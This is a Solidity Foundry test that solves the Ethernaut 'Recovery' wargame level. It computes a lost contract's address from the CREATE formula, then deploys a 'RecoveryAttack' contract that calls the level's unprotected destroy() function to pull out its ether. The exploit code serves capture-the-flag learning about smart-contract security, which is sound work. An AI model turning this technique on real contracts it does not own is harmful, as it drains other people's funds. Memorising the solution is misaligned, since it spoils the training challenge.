// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {RecoveryFactory} from "../src/factories/RecoveryFactory.sol";
import {Recovery, SimpleToken} from "../src/levels/Recovery.sol";

import "forge-std/console.sol";

contract RecoveryTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        RecoveryFactory factory = new RecoveryFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(
            factory
        );
    }

    function testSolveRecovery() public {
        Recovery instance = Recovery(payable(levelAddress));

        // [START]

        /**
         * NOTE nonces works differently for EOA and Contracts. While for a contract,
         * the nonce (start from 1) is the number of contract that the contract itself has created,
         * for EOA the nonce (start from 0) is the number of transaction that it has made.
         * NOTE the `new` keyword uses the `CREATE` opcode.
         * NOTE bytes20(some_bytes32_value) is capturing top (left) 20 bytes.
         * NOTE uint160(uint256(some_bytes32_value)) is capturing lowest (right) 20 bytes.
         */
        address newAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            address(instance),
                            bytes1(0x01)
                        )
                    )
                )
            )
        );

        RecoveryAttack attacker = new RecoveryAttack(newAddress);

        attacker.attack();

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}

interface IRecovery {
    function destroy(address payable _to) external;
}

// Attacker contract
contract RecoveryAttack {
    IRecovery public recovery;

    constructor(address _recovery) {
        recovery = IRecovery(_recovery);
    }

    function attack() external {
        recovery.destroy(payable(msg.sender));
    }
}
